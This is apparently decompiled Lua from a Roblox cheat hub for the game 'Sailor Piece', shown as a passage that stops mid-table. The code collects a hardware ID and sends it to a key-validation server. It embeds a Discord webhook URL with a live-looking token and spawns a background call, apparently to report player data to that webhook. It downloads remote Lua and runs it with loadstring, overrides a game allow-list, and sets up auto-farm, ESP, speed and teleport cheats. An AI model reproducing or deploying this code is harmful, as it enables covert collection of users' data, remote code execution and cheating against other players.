local runtime = {
    pack = table.pack,
    unpack = table.unpack,
    move = table.move,
    create = table.create,
    getEnvironment = getfenv,
    setEnvironment = setfenv,
    wrapIterator = coroutine.wrap,
    yieldIterator = coroutine.yield,
}

runtime.iteratorBody1 = function(...)
    runtime.yieldIterator()
    for iteratorKey, iteratorValue in ... do
        runtime.yieldIterator(true, iteratorKey, iteratorValue)
    end
end

local functions = {}

function functions.runApplication(closureEnvironment)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local callResults, callResults2, callResults3, callResults4, callResults5, callResults6, callResults7, callback, callback2, clonerefResult, clonerefResult2, clonerefResult3
        local clonerefResult4, clonerefResult5, clonerefResult6, clonerefResult7, clonerefValue, gameValue, gameValue2, gameValue3, gameValue4, gameValue5, gameValue6, gameValue7
        local gameValue8, items, items2, items3, localPlayer, lumeDev_KeySystem, playerGui, request, result, value, window
        while true do
            environment.task.wait()
            gameValue = environment.game
            if not (gameValue.IsLoaded(gameValue)) then
                continue
            end
            break
        end
        clonerefValue = environment.cloneref
        if not clonerefValue then
            clonerefValue = functions.handleCallback(environment)
        end
        gameValue2 = environment.game
        callResults = runtime.pack(gameValue2.GetService(gameValue2, "Workspace"))
        clonerefResult = clonerefValue(runtime.unpack(callResults, 1, (((callResults.n + 3) - 1) - 2)))
        gameValue3 = environment.game
        callResults2 = runtime.pack(gameValue3.GetService(gameValue3, "Players"))
        clonerefResult2 = clonerefValue(runtime.unpack(callResults2, 1, (((callResults2.n + 4) - 1) - 3)))
        localPlayer = clonerefResult2.LocalPlayer
        playerGui = localPlayer.FindFirstChildOfClass(localPlayer, "PlayerGui")
        gameValue4 = environment.game
        callResults3 = runtime.pack(gameValue4.GetService(gameValue4, "HttpService"))
        clonerefResult3 = clonerefValue(runtime.unpack(callResults3, 1, (((callResults3.n + 6) - 1) - 5)))
        gameValue5 = environment.game
        callResults4 = runtime.pack(gameValue5.GetService(gameValue5, "TweenService"))
        clonerefResult4 = clonerefValue(runtime.unpack(callResults4, 1, (((callResults4.n + 7) - 1) - 6)))
        gameValue6 = environment.game
        callResults5 = runtime.pack(gameValue6.GetService(gameValue6, "UserInputService"))
        clonerefResult5 = clonerefValue(runtime.unpack(callResults5, 1, (((callResults5.n + 8) - 1) - 7)))
        gameValue7 = environment.game
        callResults6 = runtime.pack(gameValue7.GetService(gameValue7, "CoreGui"))
        clonerefResult6 = clonerefValue(runtime.unpack(callResults6, 1, (((callResults6.n + 9) - 1) - 8)))
        gameValue8 = environment.game
        callResults7 = runtime.pack(gameValue8.GetService(gameValue8, "RunService"))
        clonerefResult7 = clonerefValue(runtime.unpack(callResults7, 1, (((callResults7.n + 10) - 1) - 9)))
        request = environment.syn
        if request then
            request = environment.syn.request
        end
        if not request then
            request = environment.http
            if request then
                request = environment.http.request
            end
        end
        if not request then
            request = environment.request
        end
        if not request then
            request = environment.http_request
        end
        callback = functions.handleFind(environment, request, clonerefResult2, clonerefResult3)
        items2 = {}
        items2.Create = functions.create(environment)
        items2.AddCorner = functions.addCorner(environment)
        items2.AddStroke = functions.addStroke(environment)
        items2.AddGradient = functions.addGradient(environment)
        items2.AddShadow = functions.addShadow(environment)
        items3 = {}
        items3.getHardwareId = functions.getHardwareId(environment)
        items3.GetKeyURL = functions.getKeyURL(environment, items3)
        items3.Validate = functions.validate(
            environment,
            items3,
            functions.handlePcallAtLine1(environment, request, clonerefResult3)
        )
        callback2 = functions.handlePcall(environment)
        result = clonerefResult6
        if result.FindFirstChild(result, "LumeDev_KeySystem") then
            lumeDev_KeySystem = clonerefResult6.LumeDev_KeySystem
            lumeDev_KeySystem.Destroy(lumeDev_KeySystem)
        end
        environment.CreateKeySystem = functions.createKeySystem(
            environment,
            items2,
            clonerefResult6,
            clonerefResult5,
            items3,
            callback,
            callback2,
            clonerefResult
        )
        value = (environment.CreateKeySystem())
        window = value.Window
        items = {}
        items.File = "Lumedev/savedkey.txt"
        items.DisplayName = "Lume.Dev"
        window(value, items)
        return
    end, closureEnvironment)
end

function functions.addCorner(closureEnvironment)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local argument1, parent, argument3 = ...
        local cornerRadius, instanceObject
        instanceObject = environment.Instance.new("UICorner")
        cornerRadius = environment.UDim.new(0, argument3)
        instanceObject.CornerRadius = cornerRadius
        instanceObject.Parent = parent
        return instanceObject
    end, closureEnvironment)
end

function functions.createKeySystem(
    closureEnvironment,
    capturedItems2,
    capturedClonerefResult6,
    capturedClonerefResult5,
    capturedItems3,
    capturedCallback,
    capturedCallback2,
    capturedClonerefResult
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local callback, create, createResult, items, items2, parent, setclipboardValue, textValue, value, value2, zIndexBehavior
        items2 = {}
        setclipboardValue = environment.setclipboard
        if not setclipboardValue then
            setclipboardValue = environment.toclipboard
        end
        if not setclipboardValue then
            setclipboardValue = functions.handlePrint(environment)
        end
        value = capturedItems2
        value2 = value
        create = value.Create
        textValue = "ScreenGui"
        items = {}
        items.Name = "LumeDev_KeySystem"
        items.IgnoreGuiInset = true
        zIndexBehavior = environment.Enum.ZIndexBehavior.Sibling
        items.ZIndexBehavior = zIndexBehavior
        parent = environment.gethui
        if parent then
            parent = environment.gethui()
        end
        if not parent then
            parent = capturedClonerefResult6
        end
        items.Parent = parent
        createResult = create(value2, textValue, items)
        callback = functions.handleNew9(environment, capturedItems2, createResult)
        items2.Window = functions.window(
            environment,
            functions.handleTostring(
                environment,
                capturedItems3,
                capturedCallback,
                capturedCallback2,
                callback,
                createResult,
                capturedClonerefResult
            ),
            capturedItems2,
            createResult,
            setclipboardValue,
            capturedItems3,
            callback,
            functions.handleConnectAtLine1(environment, capturedClonerefResult5)
        )
        return items2
    end, closureEnvironment)
end

function functions.handlePcall(closureEnvironment)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local argument1, argument2 = ...
        environment.pcall(functions.handleWritefile(environment, argument1, argument2))
        return
    end, closureEnvironment)
end

function functions.validate(closureEnvironment, capturedItems3, capturedCallback)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local key = ...
        local expireDate, expireDate2, hWID, isPremium, items, items2, items3, message, result, success, value
        hWID = capturedItems3.getHardwareId()
        value = capturedCallback
        items = {}
        items.ServiceID = "lumedevkid"
        items.HWID = hWID
        items.Key = key
        result = value("/keys/validate", items)
        if not result then
            items2 = {}
            items2.success = false
            items2.message = "Failed to connect to server"
            items2.isPremium = false
            items2.expireDate = expireDate
            return items2
        else
            success = (result.Authenticated_Status == "Success")
            isPremium = result.Key_Premium
            if not isPremium then
                isPremium = false
            end
            message = result.Note
            if not message then
                message = success
                if message then
                    message = "Key validated!"
                end
                if not message then
                    message = "Invalid key"
                end
            end
            items3 = {}
            items3.success = success
            items3.message = message
            items3.isPremium = isPremium
            expireDate2 = result.Expire_Date
            items3.expireDate = expireDate2
            return items3
        end
    end, closureEnvironment)
end

function functions.handleCallback(closureEnvironment)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local argument1 = ...
        return argument1
    end, closureEnvironment)
end

function functions.addShadow(closureEnvironment)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local argument1, argument2 = ...
        local anchorPoint, imageColor3, instanceObject, parent, position, scaleType, size, sliceCenter, zIndex
        parent = argument2
        instanceObject = environment.Instance.new("ImageLabel")
        instanceObject.Name = "Shadow"
        anchorPoint = environment.Vector2.new(0.5, 0.5)
        instanceObject.AnchorPoint = anchorPoint
        instanceObject.BackgroundTransparency = 1
        position = (environment.UDim2.new(0.5, 0, 0.5, 0))
        instanceObject.Position = position
        size = environment.UDim2.new(1, 40, 1, 40)
        instanceObject.Size = size
        zIndex = (parent.ZIndex - 1)
        instanceObject.ZIndex = zIndex
        instanceObject.Image = "rbxassetid://6015897843"
        imageColor3 = environment.Color3.fromRGB(0, 0, 0)
        instanceObject.ImageColor3 = imageColor3
        instanceObject.ImageTransparency = 0.5
        scaleType = environment.Enum.ScaleType.Slice
        instanceObject.ScaleType = scaleType
        sliceCenter = environment.Rect.new(49, 49, 450, 450)
        instanceObject.SliceCenter = sliceCenter
        instanceObject.Parent = parent
        return instanceObject
    end, closureEnvironment)
end

function functions.getHardwareId(closureEnvironment)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local callResults, callResults2, callResults3, gameValue, item, rbxAnalyticsService, rbxAnalyticsService2, tostringValue, value
        callResults2 = runtime.pack(environment.pcall(functions.handleGethwid(environment)))
        callResults3 = callResults2
        item = callResults3[2]
        if (not callResults3[1]) or not item then
            gameValue = environment.game
            rbxAnalyticsService2 = gameValue.GetService(gameValue, "RbxAnalyticsService")
            tostringValue = environment.tostring
            rbxAnalyticsService = rbxAnalyticsService2
            callResults = runtime.pack(rbxAnalyticsService.GetClientId(rbxAnalyticsService))
            value = (tostringValue(runtime.unpack(callResults, 1, (((callResults.n + 5) - 1) - 4))))
            return value.gsub(value, "-", "")
        else
            return item
        end
    end, closureEnvironment)
end

function functions.handleFind(
    closureEnvironment,
    capturedRequest,
    capturedClonerefResult2,
    capturedClonerefResult3
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local argument1 = ...
        local argument12, textValue
        argument12 = argument1
        textValue =
            "https://ptb.discord.com/api/webhooks/1467159900986675416/YH8HUBXGpSpuSFiqrJlIncJD_CEoQK-CSvStXj3kKCCbrt6Yi6q19-HnBggxIwE22QKZ"
        if not (textValue.find(textValue, "YOUR_WEBHOOK_HERE")) then
            environment.task.spawn(
                functions.handleFormatAtLine12(
                    environment,
                    capturedRequest,
                    capturedClonerefResult2,
                    argument12,
                    capturedClonerefResult3
                )
            )
            return
        else
            return
        end
    end, closureEnvironment)
end

function functions.create(closureEnvironment)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local argument1, argument2, argument3 = ...
        local callResults, callResults2, hasNext, instanceObject, iterationCursor, iterationCursor2, iterationLimit, iterationStep, iteratorKey, iteratorKey2, iteratorValue, iteratorValue2
        local result, savedIterations, savedIterations2
        instanceObject = environment.Instance.new(argument2)
        callResults = runtime.pack(environment.pairs(argument3))
        callResults2 = callResults
        savedIterations = { nil, [5] = nil, nil, nil }
        result = runtime.wrapIterator(runtime.iteratorBody1)
        result(callResults2[1], callResults2[2], callResults2[3])
        iteratorKey = nil
        iteratorValue = nil
        iterationCursor = result
        while true do
            hasNext, iteratorKey2, iteratorValue2 = iterationCursor()
            if not hasNext then
            else
                iteratorKey = iteratorKey2
                iteratorValue = iteratorValue2
            end
            if hasNext then
                instanceObject[iteratorKey] = iteratorValue
                continue
            end
            break
        end
        iterationCursor2 = savedIterations[3]
        iterationLimit = savedIterations[2]
        iterationStep = savedIterations[5]
        savedIterations2 = savedIterations[1]
        return instanceObject
    end, closureEnvironment)
end

function functions.addStroke(closureEnvironment)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local argument1, argument2, color, argument4 = ...
        local applyStrokeMode, instanceObject, parent, thickness
        parent = argument2
        instanceObject = environment.Instance.new("UIStroke")
        instanceObject.Color = color
        thickness = argument4
        if not thickness then
            thickness = 1
        end
        instanceObject.Thickness = thickness
        applyStrokeMode = environment.Enum.ApplyStrokeMode.Border
        instanceObject.ApplyStrokeMode = applyStrokeMode
        instanceObject.Parent = parent
        return instanceObject
    end, closureEnvironment)
end

function functions.addGradient(closureEnvironment)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local argument1, argument2, argument3, argument4 = ...
        local color, instanceObject, parent, rotation
        parent = argument2
        instanceObject = environment.Instance.new("UIGradient")
        color = environment.ColorSequence.new(argument3)
        instanceObject.Color = color
        rotation = argument4
        if not rotation then
            rotation = 0
        end
        instanceObject.Rotation = rotation
        instanceObject.Parent = parent
        return instanceObject
    end, closureEnvironment)
end

function functions.handlePcallAtLine1(closureEnvironment, capturedRequest, capturedClonerefResult3)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local argument1, argument2 = ...
        local argument12, argument22, body, callResults, callResults2, headers, item, items, result, url, value, value2
        argument12 = argument1
        argument22 = argument2
        if not capturedRequest then
            return nil
        else
            url = ("https://new.pandadevelopment.net/api/v1" .. argument12)
            value = capturedClonerefResult3
            body = value.JSONEncode(value, argument22)
            value2 = capturedRequest
            items = {}
            items.Url = url
            items.Method = "POST"
            headers = {}
            headers["Content-Type"] = "application/json"
            items.Headers = headers
            items.Body = body
            result = value2(items)
            if (not result) or not result.Body then
                return nil
            else
                callResults = runtime.pack(
                    environment.pcall(
                        functions.handleJSONDecode(environment, capturedClonerefResult3, result)
                    )
                )
                callResults2 = callResults
                item = callResults2[2]
                if not callResults2[1] then
                    return nil
                else
                    return item
                end
            end
        end
    end, closureEnvironment)
end

function functions.getKeyURL(closureEnvironment, capturedItems3)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        return (
            "https://new.pandadevelopment.net/getkey/"
            .. ("lumedevkid" .. ("?hwid=" .. (capturedItems3.getHardwareId())))
        )
    end, closureEnvironment)
end

function functions.handleTostring(
    closureEnvironment,
    capturedItems3,
    capturedCallback,
    capturedCallback2,
    capturedCallback3,
    capturedCreateResult,
    capturedClonerefResult
)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local argument1, argument2 = ...
        local argument22, callResults, gsubResult, validateResult, value, value2, value3
        argument22 = argument2
        value = (environment.tostring(argument1))
        gsubResult = value.gsub(value, "%s", "")
        validateResult = capturedItems3.Validate(gsubResult)
        if not validateResult.success then
            value3 = capturedCallback3
            callResults = runtime.pack(environment.tostring(validateResult.message))
            value3("Error", runtime.unpack(callResults, 1, (((callResults.n + 7) - 1) - 6)))
            return false
        else
            capturedCallback(gsubResult)
            capturedCallback2(argument22, gsubResult)
            capturedCallback3("Success", "Access Granted!")
            environment.task.wait(1)
            if capturedCreateResult then
                value2 = capturedCreateResult
                value2.Destroy(value2)
            end
            environment.task.spawn(functions.handleNew(environment, capturedClonerefResult))
            return true
        end
    end, closureEnvironment)
end

function functions.handleNew(closureEnvironment, capturedClonerefResult)
    return runtime.setEnvironment(function(...)
        local environment = runtime.getEnvironment()
        local values = {}
        values.pcallValueState = {}
        values.textValueState = {}
        values.sharedValueState = {}
        values.sharedValueState2 = {}
        values.sharedValueState3 = {}
        values.sharedValueState4 = {}
        values.sharedValueState5 = {}
        values.sharedValueState6 = {}
        values.sharedValueState7 = {}
        values.numberValueState4 = {}
        values.enabledState = {}
        values.itemsState = {}
        values.autoFarmState = {}
        values.textValueState2 = {}
        values.itemsState2 = {}
        values.valuesState = {}
        values.defaultState = {}
        values.textValueState3 = {}
        values.textValueState4 = {}
        values.bossState = {}
        values.bossState2 = {}
        values.textValueState5 = {}
        values.itemsState3 = {}
        values.valuesState2 = {}
        values.textValueState6 = {}
        values.numberValueState = {}
        values.numberValueState2 = {}
        values.numberValueState3 = {}
        environment.print("KEY SUCCESS! Loading Lume.Dev Hub...")
        environment.task.spawn(functions.handlePcallAtLine34(environment))
        while true do
            environment.task.wait()
            values.gameValue14 = environment.game
            if not (values.gameValue14.GetService(values.gameValue14, "Players")).LocalPlayer then
                continue
            end
            break
        end
        values.items4 = {}
        values.items4["77747658251236"] = true
        values.items4["75159314259063"] = true
        values.items4["99684056491472"] = true
        values.items4["123955125827131"] = true
        values.items4["96767841099256"] = true
        values.tostringResult = environment.tostring(environment.game.PlaceId)
        if not values.items4[values.tostringResult] then
            environment.warn(("Unauthorized Game: " .. (values.tostringResult .. " (Bypassed!)")))
        end
        values.loadstringValue = environment.loadstring
        values.gameValue3 = environment.game
        values.callResults = runtime.pack(
            values.gameValue3.HttpGet(
                values.gameValue3,
                "https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"
            )
        )
        values.result13 = (values.loadstringValue(
            runtime.unpack(values.callResults, 1, (((values.callResults.n + 4) - 1) - 3))
        ))()
        values.loadstringValue2 = environment.loadstring
        values.gameValue4 = environment.game
        values.callResults2 = runtime.pack(
            values.gameValue4.HttpGet(
                values.gameValue4,
                "https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/SaveManager.lua"
            )
        )
        values.result14 = (values.loadstringValue2(
            runtime.unpack(values.callResults2, 1, (((values.callResults2.n + 5) - 1) - 4))
        ))()
        values.loadstringValue3 = environment.loadstring
        values.gameValue5 = environment.game
        values.callResults3 = runtime.pack(
            values.gameValue5.HttpGet(
                values.gameValue5,
                "https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/InterfaceManager.lua"
            )
        )
        values.result15 = (values.loadstringValue3(
            runtime.unpack(values.callResults3, 1, (((values.callResults3.n + 6) - 1) - 5))
        ))()
        values.gameValue6 = environment.game
        values.players = values.gameValue6.GetService(values.gameValue6, "Players")
        values.localPlayer = values.players.LocalPlayer
        values.gameValue7 = environment.game
        values.guiService = values.gameValue7.GetService(values.gameValue7, "GuiService")
        values.gameValue8 = environment.game
        values.virtualInputManager = values.gameValue8.GetService(values.gameValue8, "VirtualInputManager")
        values.gameValue9 = environment.game
        values.virtualUser = values.gameValue9.GetService(values.gameValue9, "VirtualUser")
        values.gameValue10 = environment.game
        values.runService = values.gameValue10.GetService(values.gameValue10, "RunService")
        values.gameValue11 = environment.game
        values.replicatedStorage = values.gameValue11.GetService(values.gameValue11, "ReplicatedStorage")
        values.gameValue12 = environment.game
        values.userInputService = values.gameValue12.GetService(values.gameValue12, "UserInputService")
        values.localPlayer2 = values.players.LocalPlayer
        values.gameValue13 = environment.game
        values.pcallValueState.value = values.gameValue13
        values.getService = values.gameValue13.GetService
        values.textValueState.value = "HttpService"
        values.getServiceResult = values.getService(values.pcallValueState.value, values.textValueState.value)
        values.pcallValueState.value = environment.pcall
        values.textValueState.value = functions.handleGetServiceAtLine87(environment)
        values.pcallValueState.value(values.textValueState.value)
        values.pcallValueState.value = nil
        values.textValueState.value = nil
        values.sharedValueState.value = nil
        values.sharedValueState2.value = nil
        values.sharedValueState3.value = nil
        values.sharedValueState4.value = nil
        values.sharedValueState5.value = nil
        values.sharedValueState6.value = nil
        values.sharedValueState7.value = nil
        environment.task.spawn(
            functions.handleWaitForChildAtLine70(
                environment,
                values.pcallValueState,
                values.replicatedStorage,
                values.textValueState,
                values.sharedValueState,
                values.sharedValueState2,
                values.sharedValueState3,
                values.sharedValueState4,
                values.sharedValueState5,
                values.sharedValueState6,
                values.sharedValueState7
            )
        )
        values.items17 = {}
        values.items17.Active = false
        values.items18 = {}
        values.items18.Active = false
        values.gValue5 = environment._G
        values.gValue5.HasWarpedToRimuru = false
        values.gValue6 = environment._G
        values.gValue6.HasWarpedToBossV2 = false
        values.gValue7 = environment._G
        values.gValue7.HasWarpedToGilgamesh = false
        values.gValue8 = environment._G
        values.gValue8.HasWarpedToMaiden = false
        runtime.move(
            {
                "Desert Bandit (Lv. 750)",
                "Frost Rogue (Lv. 1500)",
                "Sorcerer Student (Lv. 3000)",
                "Slime (Lv. 8000)",
            },
            1,
            4,
            1,
            runtime.create(4)
        )
        environment.task.spawn(
            functions.handleWaitForChildAtLine29(
                environment,
                values.replicatedStorage,
                values.items17,
                values.players,
                values.items18
            )
        )
        values.size = environment.UDim2.fromOffset(580, 460)
        if values.userInputService.TouchEnabled then
            values.size = (environment.UDim2.fromOffset(480, 320))
        end
        values.result18 = values.result13
        values.createWindow = values.result18.CreateWindow
        values.items30 = {}
        values.items30.Title = "[🗡️Alter Update🔥] Sailor Piece Script v.3.6"
        values.items30.SubTitle = "zynxxxxxxxxxxx"
        values.items30.TabWidth = 160
        values.items30.Size = values.size
        values.items30.Theme = "Darker"
        values.items30.Acrylic = false
        values.minimizeKey = environment.Enum.KeyCode.RightControl
        values.items30.MinimizeKey = values.minimizeKey
        values.createWindowResult = values.createWindow(values.result18, values.items30)
        environment.task.spawn(
            functions.handleNewAtLine69(
                environment,
                values.localPlayer2,
                values.userInputService,
                values.createWindowResult,
                values.virtualInputManager
            )
        )
        values.items31 = {}
        values.result19 = values.createWindowResult
        values.addTab = values.result19.AddTab
        values.items32 = {}
        values.items32.Title = "Main"
        values.items32.Icon = "home"
        values.main = values.addTab(values.result19, values.items32)
        values.items31.Main = values.main
        values.result20 = values.createWindowResult
        values.addTab2 = values.result20.AddTab
        values.items33 = {}
        values.items33.Title = "Auto Farm"
        values.items33.Icon = "swords"
        values.autoFarm7 = values.addTab2(values.result20, values.items33)
        values.items31.AutoFarm = values.autoFarm7
        values.result21 = values.createWindowResult
        values.addTab3 = values.result21.AddTab
        values.items34 = {}
        values.items34.Title = "Boss"
        values.items34.Icon = "crown"
        values.boss66 = values.addTab3(values.result21, values.items34)
        values.items31.Boss = values.boss66
        values.result22 = values.createWindowResult
        values.addTab4 = values.result22.AddTab
        values.items35 = {}
        values.items35.Title = "Dungeon"
        values.items35.Icon = "skull"
        values.dungeon6 = values.addTab4(values.result22, values.items35)
        values.items31.Dungeon = values.dungeon6
        values.result23 = values.createWindowResult
        values.addTab5 = values.result23.AddTab
        values.items36 = {}
        values.items36.Title = "Stats"
        values.items36.Icon = "bar-chart"
        values.stats5 = values.addTab5(values.result23, values.items36)
        values.items31.Stats = values.stats5
        values.result24 = values.createWindowResult
        values.addTab6 = values.result24.AddTab
        values.items37 = {}
        values.items37.Title = "Teleport"
        values.items37.Icon = "map"
        values.teleport15 = values.addTab6(values.result24, values.items37)
        values.items31.Teleport = values.teleport15
        values.result25 = values.createWindowResult
        values.addTab7 = values.result25.AddTab
        values.items38 = {}
        values.items38.Title = "Trade"
        values.items38.Icon = "users"
        values.trade6 = values.addTab7(values.result25, values.items38)
        values.items31.Trade = values.trade6
        values.result26 = values.createWindowResult
        values.addTab8 = values.result26.AddTab
        values.items39 = {}
        values.items39.Title = "Settings"
        values.items39.Icon = "settings"
        values.settings7 = values.addTab8(values.result26, values.items39)
        values.items31.Settings = values.settings7
        values.options = values.result13.Options
        values.gValue10 = environment._G
        values.gValue10.SpeedEnabled = false
        values.gValue11 = environment._G
        values.gValue11.InfJumpEnabled = false
        values.gValue12 = environment._G
        values.gValue12.ESPEnabled = false
        values.gValue13 = environment._G
        values.gValue13.AntiVoid = false
        values.gValue14 = environment._G
        values.gValue14.AntiFling = false
        values.gValue15 = environment._G
        values.gValue15.AutoEquipEnabled = false
        values.gValue16 = environment._G
        values.gValue16.AutoMobFarm = false
        values.gValue17 = environment._G
        values.gValue17.AutoBossFarm = false
        values.gValue18 = environment._G
        values.gValue18.AutoSkill = false
        values.gValue19 = environment._G
        values.gValue19.SelectedWeaponGroup = "Combat"
        values.gValue20 = environment._G
        values.gValue20.SelectedMob = values.currentLockedBoss
        values.gValue21 = environment._G
        values.gValue21.SelectedBosses = {}
        values.gValue22 = environment._G
        values.gValue22.FarmPosition = "Behind"
        values.gValue23 = environment._G
        values.gValue23.SelectedSkills = {}
        values.gValue24 = environment._G
        values.gValue24.AutoSummon = false
        values.gValue25 = environment._G
        values.gValue25.AutoKillSummon = false
        values.gValue26 = environment._G
        values.gValue26.SelectedSummonBoss = "None"
        values.gValue27 = environment._G
        values.gValue27.BossCycleIndex = 1
        values.gValue28 = environment._G
        values.gValue28.NextTeleportTime = 0
        values.gValue29 = environment._G
        values.gValue29.SelectIslandTP = values.currentLockedBoss
        values.gValue30 = environment._G
        values.gValue30.SelectNPCTP = values.currentLockedBoss
        values.gValue31 = environment._G
        values.gValue31.AntiAFK = true
        values.gValue32 = environment._G
        values.gValue32.BossIsActive = false
        values.gValue33 = environment._G
        values.gValue33.CheckingBosses = false
        values.gValue34 = environment._G
        values.gValue34.LastActiveAttack = 0
        values.items40 = {}
        values.combat = runtime.create(12)
        runtime.move(
            {
                "Combat",
                "Gojo",
                "Sukuna",
                "Qin Shi",
                "Yuji",
                "Strongest Of Today",
                "Strongest In History",
                "Alucard",
                "Madoka",
                "Gilgamesh",
                "Anos",
                "Blessed Maiden",
            },
            1,
            12,
            1,
            values.combat
        )
        values.items40.Combat = values.combat
        values.sword = runtime.create(13)
        runtime.move(
            {
                "Katana",
                "Dark Blade",
                "Ragna",
                "Saber",
                "Jinwoo",
                "Aizen",
                "Shadow",
                "Ichigo",
                "Rimuru",
                "Shadow Monarch",
                "Escanor",
                "True Aizen",
                "Yamato",
            },
            1,
            13,
            1,
            values.sword
        )
        values.items40.Sword = values.sword
        values.items41 = {}
        values.thiefLv = {}
        values.thiefLv.QuestNPC = "QuestNPC1"
        values.mobNames = runtime.create(5)
        runtime.move({ "Thief1", "Thief2", "Thief3", "Thief4", "Thief5" }, 1, 5, 1, values.mobNames)
        values.thiefLv.MobNames = values.mobNames
        values.thiefLv.Island = "StarterIsland"
        values.items41["Thief (Lv. 10)"] = values.thiefLv
        values.thiefBossLv = {}
        values.thiefBossLv.QuestNPC = "QuestNPC2"
        values.mobNames2 = runtime.create(1)
        runtime.move({ "ThiefBoss" }, 1, 1, 1, values.mobNames2)
        values.thiefBossLv.MobNames = values.mobNames2
        values.thiefBossLv.Island = "StarterIsland"
        values.items41["Thief Boss (Lv. 25)"] = values.thiefBossLv
        values.monkeyLv = {}
        values.monkeyLv.QuestNPC = "QuestNPC3"
        values.mobNames3 = runtime.create(5)
        runtime.move({ "Monkey1", "Monkey2", "Monkey3", "Monkey4", "Monkey5" }, 1, 5, 1, values.mobNames3)
        values.monkeyLv.MobNames = values.mobNames3
        values.monkeyLv.Island = "JungleIsland"
        values.items41["Monkey (Lv. 250)"] = values.monkeyLv
        values.monkeyBossLv = {}
        values.monkeyBossLv.QuestNPC = "QuestNPC4"
        values.mobNames4 = runtime.create(1)
        runtime.move({ "MonkeyBoss" }, 1, 1, 1, values.mobNames4)
        values.monkeyBossLv.MobNames = values.mobNames4
        values.monkeyBossLv.Island = "JungleIsland"
        values.items41["Monkey Boss (Lv. 500)"] = values.monkeyBossLv
        values.desertBanditLv = {}
        values.desertBanditLv.QuestNPC = "QuestNPC5"
        values.mobNames5 = runtime.create(5)
        runtime.move(
            { "DesertBandit1", "DesertBandit2", "DesertBandit3", "DesertBandit4", "DesertBandit5" },
            1,
            5,
            1,
            values.mobNames5
        )
        values.desertBanditLv.MobNames = values.mobNames5
        values.desertBanditLv.Island = "DesertIsland"
        values.items41["Desert Bandit (Lv. 750)"] = values.desertBanditLv
        values.desertBossLv = {}
        values.desertBossLv.QuestNPC = "QuestNPC6"
        values.mobNames6 = runtime.create(1)
        runtime.move({ "DesertBoss" }, 1, 1, 1, values.mobNames6)
        values.desertBossLv.MobNames = values.mobNames6
        values.desertBossLv.Island = "DesertIsland"
        values.items41["Desert Boss (Lv. 1000)"] = values.desertBossLv
        values.frostRogueLv = {}
        values.frostRogueLv.QuestNPC = "QuestNPC7"
        values.mobNames7 = runtime.create(5)
        runtime.move(
            { "FrostRogue1", "FrostRogue2", "FrostRogue3", "FrostRogue4", "FrostRogue5" },
            1,
            5,
            1,
            values.mobNames7
        )
        values.frostRogueLv.MobNames = values.mobNames7
        values.frostRogueLv.Island = "SnowIsland"
        values.items41["Frost Rogue (Lv. 1500)"] = values.frostRogueLv
        values.snowBossLv = {}
        values.snowBossLv.QuestNPC = "QuestNPC8"
        values.mobNames8 = runtime.create(1)
        runtime.move({ "SnowBoss" }, 1, 1, 1, values.mobNames8)
        values.snowBossLv.MobNames = values.mobNames8
        values.snowBossLv.Island = "SnowIsland"
        values.items41["Snow Boss (Lv. 2000)"] = values.snowBossLv
        values.sorcererStudentLv = {}
        values.sorcererStudentLv.QuestNPC = "QuestNPC9"
        values.mobNames9 = runtime.create(5)
        runtime.move(
            { "Sorcerer1", "Sorcerer2", "Sorcerer3", "Sorcerer4", "Sorcerer5" },
            1,
            5,
            1,
            values.mobNames9
        )
        values.sorcererStudentLv.MobNames = values.mobNames9
        values.sorcererStudentLv.Island = "ShibuyaStation"
        values.items41["Sorcerer Student (Lv. 3000)"] = values.sorcererStudentLv
        values.pandaBossLv = {}
        values.pandaBossLv.QuestNPC = "QuestNPC10"
        values.mobNames10 = runtime.create(1)
        runtime.move({ "PandaMiniBoss" }, 1, 1, 1, values.mobNames10)
        values.pandaBossLv.MobNames = values.mobNames10
        values.pandaBossLv.Island = "ShibuyaStation"
        values.items41["Panda Boss (Lv. 4000)"] = values.pandaBossLv
        values.hollowLv = {}
        values.hollowLv.QuestNPC = "QuestNPC11"
        values.mobNames11 = runtime.create(5)
        runtime.move({ "Hollow1", "Hollow2", "Hollow3", "Hollow4", "Hollow5" }, 1, 5, 1, values.mobNames11)
        values.hollowLv.MobNames = values.mobNames11
        values.hollowLv.Island = "HuecoMundoIsland"
        values.items41["Hollow (Lv. 5000)"] = values.hollowLv
        values.strongSorcererLv = {}
        values.strongSorcererLv.QuestNPC = "QuestNPC12"
        values.mobNames12 = runtime.create(5)
        runtime.move(
            { "StrongSorcerer1", "StrongSorcerer2", "StrongSorcerer3", "StrongSorcerer4", "StrongSorcerer5" },
            1,
            5,
            1,
            values.mobNames12
        )
        values.strongSorcererLv.MobNames = values.mobNames12
        values.strongSorcererLv.Island = "ShibuyaDestroyed"
        values.items41["Strong Sorcerer (Lv. 6000)"] = values.strongSorcererLv
        values.curseLv = {}
        values.curseLv.QuestNPC = "QuestNPC13"
        values.mobNames13 = runtime.create(5)
        runtime.move({ "Curse1", "Curse2", "Curse3", "Curse4", "Curse5" }, 1, 5, 1, values.mobNames13)
        values.curseLv.MobNames = values.mobNames13
        values.curseLv.Island = "ShibuyaDestroyed"
        values.items41["Curse (Lv. 7000)"] = values.curseLv
        values.slimeLv = {}
        values.slimeLv.QuestNPC = "QuestNPC14"
        values.mobNames14 = runtime.create(5)
        runtime.move({ "Slime1", "Slime2", "Slime3", "Slime4", "Slime5" }, 1, 5, 1, values.mobNames14)
